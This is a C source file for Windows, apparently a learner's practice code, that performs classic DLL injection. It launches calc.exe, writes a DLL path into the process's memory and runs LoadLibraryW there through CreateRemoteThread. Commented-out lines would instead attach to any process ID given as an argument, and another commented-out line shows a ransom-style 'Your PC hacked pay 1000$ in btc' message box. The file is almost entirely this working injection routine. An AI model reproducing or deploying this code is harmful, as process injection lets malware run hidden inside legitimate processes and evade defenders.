#include<windows.h>
#include<stdio.h>

DWORD PID ,TID= NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rbuffer = NULL;
HMODULE hKERNEL32 = NULL;
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi={0};

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\dell\\Desktop\\codeinJava\\javascript&typescript\\inject.dll";
size_t dllPathSize = sizeof(dllPath);


int main(int argc,char ** argv){

    // we created a dummy process
if(CreateProcessW(
        L"C:\\Windows\\System32\\calc.exe",
        NULL,
        NULL,
        NULL,
        0,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &si,
        &pi

    )){
        printf("calc process created succesfully!\n");
    //     MessageBoxA
    // (
    //     NULL,
    //     "Your PC hacked pay 1000$ in btc to recover!",
    //     "hello world",
    //     MB_YESNOCANCEL | MB_ICONERROR
    // );

    }else{
        printf("calc process couldnot be created \n");
        return EXIT_FAILURE;
    }
    
    // we took the process handle and process id
    hProcess = pi.hProcess;
    PID = pi.dwProcessId;

    // if(argc<2){
    //     printf("pass the pid too!");
    // }

    // PID = atoi(argv[1]);
    
    // hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,PID);

    if(hProcess == NULL){
        printf("[*] could'nt get a hndle to the prcess %ld error-code : %ld\n",PID,GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Successfully opened the process with pid %ld, and handle %p\n",PID,hProcess);

    // allcatiing virual memory for that open process                                                                             //rw
    rbuffer = VirtualAllocEx(hProcess,NULL,dllPathSize,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[*] Successfully Allocated the %u-bytes with the rwx privledges\n",sizeof(dllPath));

    if (rbuffer == NULL){
        printf("[*] couldnt create rbuffer , error: %ld\n",GetLastError());
        return EXIT_FAILURE;
    }

    // writting the path to dll into that virtual memory !
    WriteProcessMemory(hProcess,rbuffer,dllPath,dllPathSize,NULL);
    printf("Succesffully wrote the %s to the process memory\n",dllPath);


    // getting the kernel32
    hKERNEL32 = GetModuleHandleW(L"Kernel32");
    if(hKERNEL32 == NULL){
        printf("[^] failed to get a handle to Kernel32.dll, error : %ld\n",GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] got a handle to Kernel32.dll ------0x%p\n",hKERNEL32);
    
    // loading the Libarry from the kernel 32
    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32,"LoadLibraryW");
    printf("[$] got the address of LoadLibraryW() =====0x%p\n",startThis);


    // createing a remote thread or process based on the path written in rbuffer with kernel32
    hThread = CreateRemoteThread(hProcess,NULL,0,startThis,rbuffer,0,&TID);
    if(hThread == NULL){
        printf("failded to get a handle to thread : %ld\n",GetLastError());
        CloseHandle(hProcess);
    }

    printf("got handler to the newly-created thread %ld\n",hThread);
    printf("waiting for the thread to finish\n");

    // waiting for the execution of the dll 
    WaitForSingleObject(hThread,INFINITE);
    printf("thread finished execution cleaning up ....\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("finished ! see you good bye!");

    return EXIT_SUCCESS;
}